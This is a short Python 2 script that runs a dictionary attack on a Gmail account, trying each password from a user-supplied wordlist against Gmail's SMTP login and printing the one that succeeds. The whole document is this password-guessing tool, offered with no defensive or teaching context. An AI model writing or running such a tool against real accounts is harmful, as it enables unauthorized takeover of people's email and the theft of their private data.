import smtplib
smtpserver=smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()
user=raw_input("Enter email:")
passf=raw_input("Enter wordlist:")
passf=open(passf,"r")
for password in passf:
	try:
		smtpserver.login(user,password)
		print("password:%s"%password)
	
	except smtplib.SMTPAuthenticationError:
		print("failed")








